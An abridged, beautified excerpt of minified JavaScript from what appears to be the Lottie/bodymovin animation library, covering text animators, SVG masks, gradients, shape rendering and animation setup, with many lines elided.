                            _ -= 1;
                        m && (
                            this.applyTransforms(this.pMatrix, this.rMatrix, this.sMatrix, this.tr, -m, !0),
                            _ -= m
                        )
                    }
                    for (
                        ...
                        if (
                            b = (s = (e = this.elemsData[i].it)[e.length - 1].transform.mProps.v.props).length,
            ...
            at.prototype.addShape = function (t) {
                this._length === this._maxLength && (
                    this.shapes = this.shapes.concat(E(this._maxLength)),
                    this._maxLength *= 2
                ),
                            ...
                            .n
                                ? "svg" === this.renderer
                                    ? this.dashStr += " " + this
                                        ...
                                        .p
                                        .v
                                    : this.dashArray[e] = this
                                        .dataProps[e]
                                        .p
                                        .v
                                : this.dashoffset[0] = this
                                    .dataProps[e]
                                    .p
                                    .v
                            }
            ...
            nt.prototype.comparePoints = function (t, e) {
                for (var s = 0, i = this.o.length / 2; s < i;) {
                    if (Math.abs(t[4 * s] - t[4 * e + 2 * s]) > .01) 
                        return !1;
                    s += 1
                }
                return !0
            ...
            var ht = function (t, e, s, i) {
                    ...
                    for (a = 1; a < e; a += 1) 
                        o += " C" + i.applyToPointStringified(r[a - 1][0], r[a - 1][1]) + " " + i.applyToPointStringified(
                            n[a][0],
                            n[a][1]
                        ) + " " + i.applyToPointStringified(h[a][0], h[a][1]);
                    return s && e && (
                        o += " C" + i.applyToPointStringified(r[a - 1][0], r[a - 1][1]) + " " + i.applyToPointStringified(n[0][0], n[0][1]) +
                ...
                lt = function () {
                    ...
                    function e() {
                        this.loadedAssets += 1,
                        this.loadedAssets === this.totalImages && this.loadedFootagesCount === this.totalFootages && this.imagesLoadedCb && this.imagesLoadedCb(
                            null
                        )
                    }
                    function s() {
                    ...
                    function a(t) {
                        var e = 0,
                            s = setInterval(function () {
                                (t.getBBox().width || e > 500) && (this._imageLoaded(), clearInterval(s)),
                                e += 1
                            }.bind(this), 50)
                    }
                    function r(t) {
            ...
            function mt(t, e, s) {
                ...
                this._renderType = e,
                this._elem = s,
                this._animatorsData = E(this._textData.a.length),
                this._pathData = {},
                this._moreOptions = {
                    alignment: {}
                },
            ...
            mt.prototype.searchProperties = function () {
                var t,
                    e,
                ...
                if (
                    ...
                    if (this._hasMaskedPath) {
                        if (_ = this._pathData.m, !this._pathData.n || this._pathData._mdf) {
                            ...
                            for (this._pathData.r.v && (M = M.reverse()), n = {
                                tLength: 0,
                                segments: []
                            }, r = M._length - 1, y = 0, a = 0; a < r; a += 1) 
                                E = j.buildBezierData(M.v[a], M.v[a + 1], [
                                    M.o[a][0] - M.v[a][0],
                                    M.o[a][1] - M.v[a][1]
                                ], [
                                    M.i[a + 1][0] - M.v[a + 1][0],
                                ...
                                y += E.segmentLength;
                            a = r,
                            _.v.c && (E = j.buildBezierData(M.v[a], M.v[0], [
                                M.o[a][0] - M.v[a][0],
                                M.o[a][1] - M.v[a][1]
                            ], [
                                M.i[0][0] - M.v[0][0],
                                M.i[0][1] - M.v[0][1]
                            ]), n.tLength += E.segmentLength, n.segments.push(E), y += E.segmentLength),
                            this._pathData.pi = n
                        }
                        if (
                            n = this._pathData.pi,
                        ...
                        for (a = 0; a < r; a += 1) 
                            ...
                            for (L = 0; L < V; L += 1) 
                                (I = A[L].a).t.propType && (
                                    ...
                                    (z = A[L].s.getMult(T[a].anIndexes[L], P.a[L].s.totalChars)).length
                                        ? nt += I.t.v * z[0] * ot
                                        : nt += I.t.v * z * ot
                                );
                            pt = !1
                    ...
                    for (a = 0; a < r; a += 1) {
                        if (D.reset(), X = 1, T[a].n) 
                            ...
                            h = tt,
                            O = !1,
                            this._hasMaskedPath && (f = st, m = (c = u[d = et].points)[f - 1], g = (
                                o = c[f]
                            ).partialLength, l = 0),
                            at = "",
                            Z = "",
                            ...
                            if (this._hasMaskedPath) {
                                ...
                                $ !== T[a].ind && (T[$] && (h += T[$].extra), h += T[a].an / 2, $ = T[a].ind),
                                h += k[0] * T[a].an * .005;
                                var ft = 0;
                                for (L = 0; L < V; L += 1) 
                                    (I = A[L].a).p.propType && (
                                ...
                                for (p = !0, this._pathData.a.v && (
                                    h = .5 * T[0].an + (y - this._pathData.f.v - .5 * T[0].an - .5 * T[T.length - 1].an) * $ / (r - 1),
                                    h += this._pathData.f.v
                                ); p;) 
                                    l + g >= h + ft || !c
                                        ? (
                                            v = (h + ft - l) / o.partialLength,
                                            B = m.point[0] + (o.point[0] - m.point[0]) * v,
                                            W = m.point[1] + (o.point[1] - m.point[1]) * v,
                                            D.translate(-k[0] * T[a].an * .005, -k[1] * N * .01),
                                            p = !1
                                        )
                                        : c && (l += o.partialLength, (f += 1) >= c.length && (
                                            f = 0,
                                            u[d += 1]
                                                ? c = u[d].points
                                                : _.v.c
                                ...
                                q = T[a].an / 2 - T[a].add,
                                D.translate(-q, 0, 0),
                                D.translate(-k[0] * T[a].an * .005, -k[1] * N * .01, 0);
                            for (L = 0; L < V; L += 1) 
                                (I = A[L].a).t.propType && (
                                    z = A[L].s.getMult(T[a].anIndexes[L], P.a[L].s.totalChars),
                                    0 === s && 0 === t.j || (
                                        this._hasMaskedPath
                                            ? z.length
                                                ? h += I.t.v * z[0]
                            ...
                            for (t.strokeWidthAnim && (Y = t.sw || 0), t.strokeColorAnim && (
                                H = t.sc
                                    ? [
                                ...
                                t.fc[0], t.fc[1], t.fc[2]
                            ]), L = 0; L < V; L += 1) 
                                (I = A[L].a).a.propType && (
                                    (z = A[L].s.getMult(T[a].anIndexes[L], P.a[L].s.totalChars)).length
                                        ? D.translate(-I.a.v[0] * z[0], -I.a.v[1] * z[1], I.a.v[2] * z[2])
                                        : D.translate(-I.a.v[0] * z, -I.a.v[1] * z, I.a.v[2] * z)
                                );
                            for (L = 0; L < V; L += 1) 
                                (I = A[L].a).s.propType && (
                                    (z = A[L].s.getMult(T[a].anIndexes[L], P.a[L].s.totalChars)).length
                                        ? D.scale(1 + (I.s.v[0] - 1) * z[0], 1 + (I.s.v[1] - 1) * z[1], 1)
                                        : D.scale(1 + (I.s.v[0] - 1) * z, 1 + (I.s.v[1] - 1) * z, 1)
                                );
                            for (L = 0; L < V; L += 1) {
                                if (
                                    I = A[L].a,
                                    ...
                                    I.sk.propType && (
                                        z.length
                                            ? D.skewFromAxis(-I.sk.v * z[0], I.sa.v * z[1])
                                            : D.skewFromAxis(-I.sk.v * z, I.sa.v * z)
                                    ),
                                    I.r.propType && (
                                        z.length
                                            ? D.rotateZ(-I.r.v * z[2])
                                    ...
                                    I.ry.propType && (
                                        z.length
                                            ? D.rotateY(I.ry.v * z[1])
                                            : D.rotateY(I.ry.v * z)
                                    ),
                                    I.rx.propType && (
                                        z.length
                                            ? D.rotateX(I.rx.v * z[0])
                                            : D.rotateX(I.rx.v * z)
                                    ),
                                    I.o.propType && (
                                        z.length
                                    ...
                                    t.strokeWidthAnim && I.sw.propType && (
                                        z.length
                                            ? Y += I.sw.v * z[0]
                                            : Y += I.sw.v * z
                                    ),
                            ...
                            for (L = 0; L < V; L += 1) 
                                (I = A[L].a).p.propType && (
                                    ...
                                    this._hasMaskedPath
                                        ? z.length
                                            ? D.translate(0, I.p.v[1] * z[0], -I.p.v[2] * z[1])
                                            : D.translate(0, I.p.v[1] * z, -I.p.v[2] * z)
                                        : z.length
                                            ? D.translate(I.p.v[0] * z[0], I.p.v[1] * z[1], -I.p.v[2] * z[2])
                                            : D.translate(I.p.v[0] * z, I.p.v[1] * z, -I.p.v[2] * z)
                                );
                            if (
                                t.strokeWidthAnim && (
                                    K = Y < 0
                                ...
                                t.strokeColorAnim && (U = "rgb(" + Math.round(255 * H[0]) + "," + Math.round(255 * H[1]) + "," +
                                        Math.round(255 * H[2]) + ")"),
                                t.fillColorAnim && t.fc && (Z = "rgb(" + Math.round(255 * G[0]) + "," + Math.round(255 * G[1]) + "," +
                                        Math.round(255 * G[2]) + ")"),
                                this._hasMaskedPath
                            ) {
                                if (
                                    D.translate(0, -t.ls),
                                    D.translate(0, k[1] * N * .01 + i, 0),
                                    this._pathData.p.v
                                ) {
                                    b = (o.point[1] - m.point[1]) / (o.point[0] - m.point[0]);
                                    var dt = 180 * Math.atan(b) / Math.PI;
                                    o.point[0] < m.point[0] && (dt += 180),
                                    D.rotate(-dt * Math.PI / 180)
                                }
                                D.translate(B, W, 0),
                                h -= k[0] * T[a].an * .005,
                                T[a + 1] && $ !== T[a + 1].ind && (
                                    h += T[a].an / 2,
                                    h += .001 * t.tr * t.finalSize
                                )
                            } else {
                                switch (
                                    D.translate(s, i, 0),
                                    t.ps && D.translate(t.ps[0], t.ps[1] + t.ascent, 0),
                                    t.j
                                ) {
                                    case 1:
                                        D.translate(
                                            T[a].animatorJustifyOffset + t.justifyOffset + (t.boxWidth - t.lineWidths[T[a].line]),
                                            0,
                                            0
                                        );
                                        break;
                                    case 2:
                                        D.translate(
                                            T[a].animatorJustifyOffset + t.justifyOffset + (t.boxWidth - t.lineWidths[T[a].line]) / 2,
                                            0,
                                            0
                                        )
                                }
                        ...
                        F <= a
                            ...
                            : (
                                ...
                                this.lettersChangedFlag = R.update(Q, K, U, Z, at, rt) || this.lettersChangedFlag
                            )
                    }
                }
            },
            ...
            mt.prototype.mHelper = new O,
            mt.prototype.defaultPropsArray = [],
            B([L], mt),
            ut.prototype.update = function (t, e, s, i, a, r) {
                ...
                !r.length || this.p[0] === r[0] && this.p[1] === r[1] && this.p[4] === r[4] && this.p[5] === r[5] && this.p[12] === r[12] && this.p[13] === r[13] || (
                    this.p = r,
                    this._mdf.p = !0,
                    n = !0
                ),
                    ...
                    H.isCombinedCharacter(e)
                        ...
                        : e >= 55296 && e <= 56319
                            ...
                            : e > 56319
                                ? (
                                    s = t.charCodeAt(a + 1),
                                    H.isZeroWidthJoiner(e, s)
                                        ? (n = !0, i[i.length - 1] += t.substr(a, 2), a += 1)
                                        : i.push(t.charAt(a))
                                )
                                : H.isZeroWidthJoiner(e)
            ...
            gt.prototype.completeTextData = function (t) {
                ...
                if (t.sz) 
                    for (var D, S, x = !0, C = t.sz[0], w = t.sz[1]; x;) {
                        ...
                        this.canResize && t.finalSize > this.minimumFontSize && w < D
                            ? (t.finalSize -= 1, t.finalLineHeight = t.finalSize * t.lh / t.s)
                            : (t.finalText = S, s = t.finalText.length, x = !1)
                    }
                y = -P,
                _ = 0;
                var T,
                ...
                for (r = 0; r < n; r += 1) {
                    for (
                        (M = R[r]).a.sc && (t.strokeColorAnim = !0),
                        ...
                        (I = p[e]).anIndexes[r] = V,
                        (
                            1 == L && "" !== I.val || 2 == L && "" !== I.val && " " !== I.val || 3 == L && (I.n || " " == I.val || e == s - 1) || 4 == L && (I.n || e == s - 1)
            ...
            var yt,
                vt = function () {
                    ...
                    function i(t, e) {
                        ...
                        this.e = "e" in e
                            ? Y.getProp(t, e.e, 0, 0, this)
                            : {
                                v: 100
                            },
                        this.o = Y.getProp(t, e.o || {
                            k: 0
                        }, 0, 0, this),
                        this.xe = Y.getProp(t, e.xe || {
                            k: 0
                        }, 0, 0, this),
                        this.ne = Y.getProp(t, e.ne || {
                            k: 0
                        }, 0, 0, this),
                        this.sm = Y.getProp(t, e.sm || {
                            k: 100
                        }, 0, 0, this),
                        this.a = Y.getProp(t, e.a, 0, .01, this),
                                ...
                                l = o(
                                    l = f === p
                                        ? i >= f
                                            ? 0
                                            : 1
                                        : 1 - t(0, e(.5 / (f - p) + (i - p) / (f - p), 1))
                                );
                            else if (4 === d) 
                                f === p
                                    ? l = 0
                                    : (l = t(0, e(.5 / (f - p) + (i - p) / (f - p), 1))) < .5
                                        ? l *= 2
                                        : l = 1 - 2 * (l - .5),
                                l = o(l);
                            else if (5 === d) {
            ...
            function wt(t, e) {
                ...
                s && this
                    .svgElement
                    .setAttribute("aria-labelledby", s);
                var h = M("defs");
                this
                    .svgElement
                    .appendChild(h);
            ...
            function Ft(t, e, i) {
                ...
                for (a = 0; a < h; a += 1) 
                    if (
                        ("a" !== c[a].mode && "n" !== c[a].mode || c[a].inv || 100 !== c[a].o.k || c[a].o.x) && (v = "mask", b = "mask"),
                        "s" !== c[a].mode && "i" !== c[a].mode || 0 !== u
                            ? p = null
                            : (
                                (p = M("rect")).setAttribute("fill", "#ffffff"),
                        ...
                        this.viewData[a] = {
                            op: Y.getProp(this.element, c[a].o, 0, .01, this.element),
                ...
                n.appendChild(r);
                    ...
                    if (
                        ...
                        0 !== c[a].x.k
                            ? (
                                v = "mask",
                                b = "mask",
                                m = Y.getProp(this.element, c[a].x, 0, null, this.element),
                                _ = P(),
                                (f = M("filter")).setAttribute("id", _),
                                (d = M("feMorphology")).setAttribute("operator", "erode"),
                        ...
                        A.appendChild(r),
                        n.appendChild(A),
                        k.setAttribute("mask", "url(" + s + "#" + y + "_" + u + ")"),
                        g.length = 0,
                        g.push(k)
                    } else 
                        g.push(r);
                    ...
                    this
                        .viewData[a]
                        .prop
                        .k || this.drawPath(c[a], this.viewData[a].prop.v, this.viewData[a])
                }
                for (this.maskElement = M(v), h = g.length, a = 0; a < h; a += 1) 
                    this
                        .maskElement
                        .appendChild(g[a]);
                u > 0 && (
                    this.maskElement.setAttribute("id", y),
                    this.element.maskedElement.setAttribute(b, "url(" + s + "#" + y + ")"),
                    n.appendChild(this.maskElement)
                ),
                this.viewData.length && this
                    .element
                    .addRenderableComponent(this)
            }
            function Tt() {}
            function Et() {}
            function Mt() {}
            ...
            function Ot(t, e, s) {
                ...
                this.o = Y.getProp(t, e.o, 0, .01, this),
                this.w = Y.getProp(t, e.w, 0, null, this),
                this.d = new rt(t, e.d || {}, "svg", this),
                this.c = Y.getProp(t, e.c, 1, 255, this),
                this.style = s,
            ...
            Ct.prototype.checkLayers = function (t) {
                var e,
                    s,
                    i = this.layers.length;
                for (this.completeLayers = !0, e = i - 1; e >= 0; e -= 1) 
                    this.elements[e] || (s = this.layers[e]).ip - s.st <= t - this
                        .layers[e]
                        .st && s
                        .op - s
                        .st > t - this
            ...
            Ct.prototype.createItem = function (t) {
                switch (t.ty) {
                    case 2:
            ...
            Ct.prototype.createCamera = function () {
                throw new Error("You're using a 3d camera. Try the html renderer.")
            },
            Ct.prototype.createAudio = function (t) {
                return new $t(t, this.globalData, this)
            },
            Ct.prototype.createFootage = function (t) {
                return new FootageElement(t, this.globalData, this)
            },
            Ct.prototype.buildAllItems = function () {
                var t,
            ...
            Ct.prototype.setProjectInterface = function (t) {
                this.globalData.projectInterface = t
            },
            Ct.prototype.initItems = function () {
                this.globalData.progressiveLoad || this.buildAllItems()
            },
            Ct.prototype.buildElementParenting = function (t, e, s) {
            ...
            Ct.prototype.addPendingElement = function (t) {
                this
                    .pendingElements
                    .push(t)
            },
            Ct.prototype.searchExtraCompositions = function (t) {
                var e,
                    s = t.length;
                for (e = 0; e < s; e += 1) 
                    if (t[e].xt) {
            ...
            Ct.prototype.setupGlobalData = function (t, e) {
                this.globalData.fontManager = new H,
                this
                    .globalData
                    .fontManager
                    .addChars(t.chars),
                ...
                this.globalData.getAssetData = this
                    .animationItem
                    .getAssetData
                    .bind(this.animationItem),
                this.globalData.getAssetsPath = this
                    .animationItem
                    .getAssetsPath
                    .bind(this.animationItem),
            ...
            B([Ct], wt),
            wt.prototype.createNull = function (t) {
            ...
            wt.prototype.configAnimation = function (t) {
                ...
                this.renderConfig.viewBoxSize
                    ? this
                        .svgElement
                        .setAttribute("viewBox", this.renderConfig.viewBoxSize)
                    : this
                        .svgElement
                        .setAttribute("viewBox", "0 0 " + t.w + " " + t.h),
                ...
                this.renderConfig.className && this
                    .svgElement
                    .setAttribute("class", this.renderConfig.className),
                this.renderConfig.id && this
                    .svgElement
                    .setAttribute("id", this.renderConfig.id),
                void 0 !== this.renderConfig.focusable && this
                    .svgElement
                    .setAttribute("focusable", this.renderConfig.focusable),
                this
                    .svgElement
                    .setAttribute("preserveAspectRatio", this.renderConfig.preserveAspectRatio),
                this
                    .animationItem
                    .wrapper
                ...
                this
                    .layerElement
                    .setAttribute("clip-path", "url(" + s + "#" + r + ")"),
                e.appendChild(i),
                this.layers = t.layers,
                this.elements = E(t.layers.length)
            },
            ...
            wt.prototype.updateContainerSize = function () {},
            wt.prototype.buildItem = function (t) {
                var s = this.elements;
            ...
            wt.prototype.renderFrame = function (t) {
                if (this.renderedFrame !== t && !this.destroyed) {
                    ...
                    for (this.completeLayers || this.checkLayers(t), e = s - 1; e >= 0; e -= 1) 
                        (this.completeLayers || this.elements[e]) && this
                            .elements[e]
                            .prepareFrame(t - this.layers[e].st);
            ...
            wt.prototype.appendElementInPos = function (t, e) {
                ...
                if (s) {
                    for (var i, a = 0; a < e;) 
                        this.elements[a] && !0 !== this.elements[a] && this
                            .elements[a]
                            .getBaseElement() && (i = this.elements[a].getBaseElement()),
                        a += 1;
                    i
                        ? this
                            .layerElement
            ...
            Ft.prototype.drawPath = function (t, e, s) {
                ...
                for (a = e._length, i = 1; i < a; i += 1) 
                    r += " C" + e.o[i - 1][0] + "," + e.o[i - 1][1] + " " + e.i[i][0] + "," + e.i[i][1] +
                            " " + e.v[i][0] + "," + e.v[i][1];
                if (
                    e.c && a > 1 && (r += " C" + e.o[i - 1][0] + "," + e.o[i - 1][1] + " " + e.i[0][0] + "," + e.i[0][1] +
                            " " + e.v[0][0] + "," + e.v[0][1]),
                    s.lastPath !== r
                ) {
                    var n = "";
            ...
            Tt.prototype = {
                ...
                checkParenting: function () {
                    void 0 !== this.data.parent && this
                        .comp
                        .buildElementParenting(this, this.data.parent, [])
                }
            },
            Et.prototype = {
                initFrame: function () {
            ...
            Mt.prototype = {
                initTransform: function () {
                    this.finalTransform = {
                        mProp: this.data.ks
                            ? G.getTransformProperty(this, this.data.ks, this)
                            : {
                                o: 0
                            },
                        _matMdf: !1,
            ...
            It.prototype = {
                ...
                removeRenderableComponent: function (t) {
                    -1 !== this
                        ...
                        .indexOf(t) && this
                        .renderableComponents
                        .splice(this.renderableComponents.indexOf(t), 1)
                },
                ...
                checkTransparency: function () {
                    this.finalTransform.mProp.o.v <= 0
                        ? !this.isTransparent && this.globalData.renderConfig.hideOnTransparent && (
                ...
                renderRenderable: function () {
                    ...
                    for (t = 0; t < e; t += 1) 
                        this
                            .renderableComponents[t]
                            .renderFrame(this._isFirstFrame)
                    },
            ...
            Bt.prototype.initGradientData = function (t, e, s) {
                this.o = Y.getProp(t, e.o, 0, .01, this),
                this.s = Y.getProp(t, e.s, 1, null, this),
                this.e = Y.getProp(t, e.e, 1, null, this),
                this.h = Y.getProp(t, e.h || {
                    k: 0
                }, 0, .01, this),
                this.a = Y.getProp(t, e.a || {
                    k: 0
            ...
            Bt.prototype.setGradientOpacity = function (t, e) {
                if (this.g._hasOpacity && !this.g._collapsable) {
                    ...
                    for (a = 4 * t.g.p; a < r; a += 2) 
                        (i = M("stop")).setAttribute("stop-color", "rgb(255,255,255)"),
                        p.appendChild(i),
                        f.push(i);
                    h.setAttribute(
                        "gf" === t.ty
                    ...
                    "gs" === t.ty && (
                        h.setAttribute("stroke-linecap", z[t.lc || 2]),
                        h.setAttribute("stroke-linejoin", N[t.lj || 2]),
                        1 === t.lj && h.setAttribute("stroke-miterlimit", t.ml)
                    ),
                    this.of = p,
                    this.ms = n,
                    this.ost = f,
            ...
            var Xt = function () {
                var t = new O,
                    e = new O;
                function s(t, e, s) {
                    (s || e.transform.op._mdf) && e
                        .transform
                        .container
                        .setAttribute("opacity", e.transform.op.v),
                    (s || e.transform.mProps._mdf) && e
                        .transform
                        .container
                        .setAttribute("transform", e.transform.mProps.v.to2dCSS())
                }
                function i(s, i, a) {
                    var r,
                        n,
                    ...
                    for (p = 0; p < g; p += 1) {
                        if (o = i.sh._mdf || a, i.styles[p].lvl < y) {
                            for (
                                ...
                                u -= 1;
                            if (o) 
                                for (c = y - i.styles[p].lvl, u = i.transformers.length - 1; c > 0;) 
                                    m = i
                                        .transformers[u]
                                        .mProps
                                        .v
                        ...
                        if (n = (f = i.sh.paths)._length, o) {
                            for (h = "", r = 0; r < n; r += 1) 
                                (l = f.shapes[r]) && l._length && (h += ht(l, l._length, l.c, d));
                            i.caches[p] = h
                        } else 
                            h = i.caches[p];
                        i
                ...
                function a(t, e, s) {
                    ...
                    (e.c._mdf || s) && i
                        ...
                        .setAttribute(
                            "fill",
                            "rgb(" + l(e.c.v[0]) + "," + l(e.c.v[1]) + "," + l(e.c.v[2]) + ")"
                        ),
                    (e.o._mdf || s) && i
                        .pElem
                ...
                function n(t, e, s) {
                    ...
                    if (1 === t.t) 
                        ...
                        (e.s._mdf || e.e._mdf || s) && (h = Math.sqrt(
                            Math.pow(p[0] - f[0], 2) + Math.pow(p[1] - f[1], 2)
                        ), o.setAttribute("r", h), l && !e.g._collapsable && e.of.setAttribute("r", h)),
                ...
                function h(t, e, s) {
                    ...
                    (e.o._mdf || s) && i
                        .pElem
                        .setAttribute("stroke-opacity", e.o.v),
                    (e.w._mdf || s) && (
            ...
            function $t(t, e, s) {
                ...
                this
                    ...
                    .addAudio(this),
                this.tm = t.tm
                    ? Y.getProp(this, t.tm, 0, e.frameRate, this)
                    : {
                        _placeholder: !0
                    }
            }
            ...
            Ht.prototype = {
                ...
                initExpressions: function () {
                    ...
                    this.data.hasMask && this.maskManager && this
                        .layerInterface
                        .registerMaskInterface(this.maskManager);
                ...
                initBaseData: function (t, e, s) {
                    ...
                    this.effectsManager = new ne(this.data, this, this.dynamicProperties)
                },
                getType: function () {
                    return this.type
                },
            ...
            Gt.prototype = {
                ...
                createContainerElements: function () {
                    ...
                    if (this.data.td) {
                        if (3 == this.data.td || 1 == this.data.td) {
                            ...
                            this
                                ...
                                .defs
                                .appendChild(r),
                            pt.maskType || 1 != this.data.td || (
                                r.setAttribute("mask-type", "luminance"),
                                t = P(),
                                e = ft.createFilter(t),
                                this.globalData.defs.appendChild(e),
                                e.appendChild(ft.createAlphaToLuminanceFilter()),
                                (i = M("g")).appendChild(this.layerElement),
                                a = i,
                                r.appendChild(i),
                    ...
                    if (
                        ...
                        if (
                            ...
                            var c = M("g");
                            c.setAttribute("clip-path", "url(" + s + "#" + m + ")"),
                            ...
                            this
                                .layerElement
                                .setAttribute("clip-path", "url(" + s + "#" + m + ")")
                        }
                    0 !== this.data.bm && this.setBlendMode()
                },
                renderElement: function () {
                    this.finalTransform._matMdf && this
                        .transformedElement
                        .setAttribute("transform", this.finalTransform.mat.to2dCSS()),
                    this.finalTransform._opMdf && this
                        .transformedElement
                        .setAttribute("opacity", this.finalTransform.mProp.o.v)
                },
                ...
                createRenderableComponents: function () {
                    ...
                    this.renderableEffectsManager = new ie
                },
                setMatte: function (t) {
                    this.matteElement && this
                        .matteElement
                        .setAttribute("mask", "url(" + s + "#" + t + ")")
                }
            },
            Jt.prototype = {
            ...
            Kt.prototype.initElement = function (t, e, s) {
                ...
                this
                    .textAnimator
                    .searchProperties(this.dynamicProperties)
            },
                ...
                if (
                    ...
                    for (
                        ...
                        (this.completeLayers || this.elements[s]) && (
                            this.elements[s].prepareFrame(this.renderedFrame - this.layers[s].st),
            ...
            Ut.prototype.renderInnerContent = function () {
                var t,
                    e = this.layers.length;
                for (t = 0; t < e; t += 1) 
                    (this.completeLayers || this.elements[t]) && this
                        .elements[t]
                        .renderFrame()
                },
            ...
            Zt.prototype.createContent = function () {
                ...
                this
                    .innerElem
                    .setAttribute("width", this.assetData.w + "px"),
                this
                    .innerElem
                    .setAttribute("height", this.assetData.h + "px"),
                this
                    .innerElem
                    .setAttribute(
                        "preserveAspectRatio",
                ...
                this
                    .innerElem
                    .setAttributeNS("http://www.w3.org/1999/xlink", "href", t),
                this
                    .layerElement
                    .appendChild(this.innerElem)
            },
            ...
            $t.prototype.renderFrame = function () {
                this.isInRange && this._canPlay && (
                    this._isPlaying
                        ? (
                            !this.audio.playing() || Math.abs(this._currentTime / this.globalData.frameRate - this.audio.seek()) > .1
            ...
            ee.prototype.buildNewText = function () {
                ...
                s.fc
                    ? this
                        .layerElement
                        .setAttribute("fill", this.buildColor(s.fc))
                    : this
                        .layerElement
                ...
                this
                    .layerElement
                    .setAttribute("font-size", s.finalSize);
                var i = this
                    .globalData
                    .fontManager
                    .getFontByName(s.f);
                if (i.fClass) 
                    this
                        .layerElement
                        .setAttribute("class", i.fClass);
                else {
                    this
                        .layerElement
                        .setAttribute("font-family", i.fFamily);
                    var a = s.fWeight,
                        r = s.fStyle;
                    this
                        .layerElement
                        .setAttribute("font-style", r),
                    this
                        .layerElement
                        .setAttribute("font-weight", a)
                }
                this
                    .layerElement
                    .setAttribute("aria-label", s.t);
                var n,
                    h = s.l || [],
                ...
                if (!d || o || s.sz) {
                    ...
                    for (t = 0; t < e; t += 1) 
                        ...
                        o
                            ? (
                                l = (y = (v = this.globalData.fontManager.getCharData(
                                    s.finalText[t],
                                    i.fStyle,
                    ...
                    for (
                        ...
                        (n = this.textSpans[t] || M("tspan")).textContent = A[t],
                        n.setAttribute("x", 0),
                        n.setAttribute("y", c),
                        n.style.display = "inherit",
                        _.appendChild(n),
            ...
            se.prototype.identityMatrix = new O,
            ...
            se.prototype.filterUniqueShapes = function () {
                var t,
                    ...
                    h = !1;
                for (s = 0; s < r; s += 1) {
                    for (i = this.stylesList[s], h = !1, n.length = 0, t = 0; t < a; t += 1) 
                        -1 !== (e = this.shapes[t])
                            .styles
                            .indexOf(i) && (n.push(e), h = e._isAnimated || h);
            ...
            se.prototype.createStyleElement = function (t, e) {
                ...
                return "st" === t.ty
                    ...
                    : "fl" === t.ty
                        ? i = new qt(this, t, a)
                        : "gf" !== t.ty && "gs" !== t.ty || (i = new(
                            "gf" === t.ty
                                ? Bt
                                : jt
                        )(this, t, a), this.globalData.defs.appendChild(i.gf), i.maskId && (
                            this.globalData.defs.appendChild(i.ms),
                            this.globalData.defs.appendChild(i.of),
                            r.setAttribute("mask", "url(" + s + "#" + i.maskId + ")")
                        )),
                "st" !== t.ty && "gs" !== t.ty || (
                    r.setAttribute("stroke-linecap", z[t.lc || 2]),
                    r.setAttribute("stroke-linejoin", N[t.lj || 2]),
                ...
                t.bm && (r.style["mix-blend-mode"] = R(t.bm)),
                this
                    .stylesList
                    .push(a),
            ...
            se.prototype.createGroupElement = function (t) {
                ...
                return t.ln && e
                    .gr
                    .setAttribute("id", t.ln),
                t.cl && e
                    .gr
                    .setAttribute("class", t.cl),
                t.bm && (e.gr.style["mix-blend-mode"] = R(t.bm)),
                e
            },
            se.prototype.createTransformElement = function (t, e) {
                var s = G.getTransformProperty(this, t, this),
                    i = new Nt(s, s.o, e);
            ...
            se.prototype.addToAnimatedContents = function (t, e) {
                ...
                this
                    .animatedContents
                    .push({fn: Xt.createRenderFunction(t), element: e, data: t})
            },
            se.prototype.setElementStyles = function (t) {
                ...
                for (e = 0; e < i; e += 1) 
                    this
                        .stylesList[e]
                        .closed || s.push(this.stylesList[e])
                },
            ...
            se.prototype.searchShapes = function (t, e, s, i, a, r, n) {
                ...
                for (h = c; h >= 0; h -= 1) {
                    if (
                        ...
                        this.searchShapes(t[h].it, e[h].it, e[h].prevViewData, e[h].gr, a + 1, m, n),
                        ...
                        "tr" === t[h].ty
                            ...
                            : "sh" === t[h].ty || "rc" === t[h].ty || "el" === t[h].ty || "sr" === t[h].ty
                                ...
                                : "tm" === t[h].ty || "rd" === t[h].ty || "ms" === t[h].ty || "pb" === t[h].ty
                                    ? (
                                        d
                                            ? (f = e[h]).closed = !1
                                            : (
            ...
            se.prototype.renderShape = function () {
                ...
                for (t = 0; t < s; t += 1) 
                    ...
                    (this._isFirstFrame || e.element._isAnimated) && !0 !== e.data && e.fn(
                        e.data,
                        e.element,
                        this._isFirstFrame
                    )
            ...
            var ae = function () {
                    ...
                    function o(t) {
                        for (var e = 0, i = t.target; e < a;) 
                            s[e].animation === i && (s.splice(e, 1), e -= 1, a -= 1, i.isPaused || f()),
                            e += 1
                    }
                    function l(t, e) {
                        if (!t) 
            ...
            B([F], re),
            re.prototype.setParams = function (t) {
                ...
                this
                    .imagePreloader
                    .setCacheType(e, this.renderer.globalData.defs),
                this
                    .renderer
                    .setProjectInterface(this.projectInterface),
                this.animType = e,
                ...
                this.name = t.name
                    ? t.name
                    : "",
                this.autoloadSegments = !Object
                    .prototype
                    .hasOwnProperty
                    .call(t, "autoloadSegments") || t.autoloadSegments,
                this.assetsPath = t.assetsPath,
                this.initialSegment = t.initialSegment,
                t.audioFactory && this
                    .audioController
                    .setAudioFactory(t.audioFactory),
                t.animationData
                    ...
                    : t.path && (
                        ...
                        dt.load(t.path, this.configAnimation.bind(this), function () {
                            this.trigger("data_failed")
                        }.bind(this))
                    )
            },
            re.prototype.setData = function (t, e) {
                ...
                s.path = i.getNamedItem("data-animation-path")
                    ? i
                        .getNamedItem("data-animation-path")
                        .value
                    : i.getNamedItem("data-bm-path")
                        ? i
                            .getNamedItem("data-bm-path")
                            .value
                        : i.getNamedItem("bm-path")
                            ? i
                                .getNamedItem("bm-path")
                                .value
                            : "",
                s.animType = i.getNamedItem("data-anim-type")
                    ? i
                        .getNamedItem("data-anim-type")
                        .value
                    : i.getNamedItem("data-bm-type")
                        ? i
                            .getNamedItem("data-bm-type")
                            .value
                        : i.getNamedItem("bm-type")
                            ? i
                                .getNamedItem("bm-type")
                                .value
                            : i.getNamedItem("data-bm-renderer")
                                ? i
                                    .getNamedItem("data-bm-renderer")
                                    .value
                                : i.getNamedItem("bm-renderer")
                                    ? i
                                        .getNamedItem("bm-renderer")
                                        .value
                                    : "canvas";
                var a = i.getNamedItem("data-anim-loop")
                    ? i
                        .getNamedItem("data-anim-loop")
                        .value
                    : i.getNamedItem("data-bm-loop")
                        ? i
                            .getNamedItem("data-bm-loop")
                            .value
                        : i.getNamedItem("bm-loop")
                            ? i
                                .getNamedItem("bm-loop")
                                .value
                            : "";
                "false" === a
                    ? s.loop = !1
                ...
                var r = i.getNamedItem("data-anim-autoplay")
                    ? i
